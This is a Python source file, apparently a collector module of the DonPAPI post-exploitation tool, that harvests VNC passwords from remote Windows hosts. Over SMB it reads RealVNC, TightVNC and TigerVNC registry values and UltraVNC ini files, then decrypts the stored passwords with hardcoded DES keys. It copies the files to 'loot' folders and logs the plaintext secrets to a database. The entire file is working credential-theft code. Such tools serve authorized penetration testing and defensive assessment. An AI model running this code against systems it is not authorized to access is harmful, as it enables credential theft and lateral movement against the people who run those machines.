import re
import codecs
from os import path
from typing import Any
from binascii import unhexlify
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter
from Cryptodome.Cipher import DES
from donpapi.lib.utils import dump_file_to_loot_directories


class VNC:
    vnc_decryption_key = b"\x17\x52\x6b\x06\x23\x4e\x58\x07"
    ultravnc_decryption_key = b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display("Dumping VNC Credentials")
        if self.context.remoteops_allowed:
            self.vnc_from_registry()
        self.vnc_from_filesystem()

    def vnc_from_registry(self):
        vncs = (
            ("RealVNC 4.x", "HKLM\\SOFTWARE\\Wow6432Node\\RealVNC\\WinVNC4", "Password"),
            ("RealVNC 3.x", "HKLM\\SOFTWARE\\RealVNC\\vncserver", "Password"),
            ("RealVNC 4.x", "HKLM\\SOFTWARE\\RealVNC\\WinVNC4", "Password"),
            ("TightVNC", "HKLM\\Software\\TightVNC\\Server", "Password"),
            ("TightVNC ControlPassword", "HKLM\\Software\\TightVNC\\Server", "ControlPassword"),
            ("TightVNC", "HKLM\\Software\\TightVNC\\Server", "PasswordViewOnly"),
            ("TigerVNC", "HKLM\\Software\\TigerVNC\\Server", "Password"),
        )
        for vnc_name, path, key in vncs:
            try:
                value = self.context.reg_query_value(path,key)
            except Exception as e:
                if "ERROR_FILE_NOT_FOUND" not in str(e):
                    self.logger.error(f"Error while RegQueryValue {path}\\{key}: {e}")
                continue
            value = value[-1].rstrip(b"\x00")
            password = self.recover_vncpassword(value)
            self.logger.secret(f"[{vnc_name}] Password: {password.decode('latin-1')}",self.tag.upper())
            self.add_to_db(password.decode('latin-1'), vnc_type=vnc_name)

    def split_len(self, seq, length):
        return [seq[i:i + length] for i in range(0, len(seq), length)]

    def recover_vncpassword(self, hash):
        encpasswd = hash.hex()
        pwd = None
        if encpasswd:
            # If the hex encoded passwd length is longer than 16 hex chars and divisible
            # by 16, then we chop the passwd into blocks of 64 bits (16 hex chars)
            # (1 hex char = 4 binary bits = 1 nibble)
            hexpasswd = bytes.fromhex(encpasswd)
            if len(hexpasswd) > 16 and (len(hexpasswd) % 16) == 0:
                splitstr = self.split_len(codecs.encode(hash, "hex"), 16)
                cryptedblocks = []
                for sblock in splitstr:
                    cryptedblocks.append(self.decrypt_password(codecs.decode(sblock, "hex")))
                    pwd = b"".join(cryptedblocks)
            elif len(hexpasswd) <= 16:
                pwd = self.decrypt_password(hash)
            else:
                pwd = self.decrypt_password(hash)
        return pwd

    def decrypt_password(self, password):
        try:
            password = (password + b"\x00" * 8)[:8]
            cipher = DES.new(key=self.ultravnc_decryption_key, mode=DES.MODE_ECB)
            data =cipher.decrypt(password)
            return data
        except Exception as ex:
            self.logger.error(f"Error while decrypting VNC password {password}: {ex}")

    def vnc_from_filesystem(self):

        vncs = (
            ("UltraVNC", "Program Files (x86)\\uvnc bvba\\UltraVNC\\ultravnc.ini"),
            ("UltraVNC", "Program Files\\uvnc bvba\\UltraVNC\\ultravnc.ini"),
            ("UltraVNC", "Program Files\\UltraVNC\\ultravnc.ini"),
            ("UltraVNC", "Program Files (x86)\\UltraVNC\\ultravnc.ini"),
        )

        for vnc_name, file in vncs:
            file_content = self.conn.readFile(self.context.share, file)
            if file_content is not None:
                absolute_local_filepath = path.join(self.context.target_output_dir, *(file.split('\\')))
                dump_file_to_loot_directories(absolute_local_filepath, file_content)
                
                collector_dir_local_filepath = path.join(self.context.global_output_dir, self.tag, file.replace("\\", "_"))
                dump_file_to_loot_directories(collector_dir_local_filepath, file_content)

                regex_passwd = [rb'passwd=[0-9A-F]+', rb'passwd2=[0-9A-F]+']
                for regex in regex_passwd:                
                    passwds_encrypted = re.findall(regex, file_content)
                    for passwd_encrypted in passwds_encrypted:
                        passwd_encrypted = passwd_encrypted.split(b'=')[-1]
                        password = self.decrypt_password(unhexlify(passwd_encrypted))
                        self.logger.secret(f"[{vnc_name}] Password: {password.decode('latin-1')}",self.tag.upper())
                        self.add_to_db(password.decode('latin-1'), vnc_type=vnc_name)

    def add_to_db(self, password, vnc_type):
        self.context.db.add_secret(computer=self.context.host, collector=self.tag, program=vnc_type, password=password, windows_user="SYSTEM")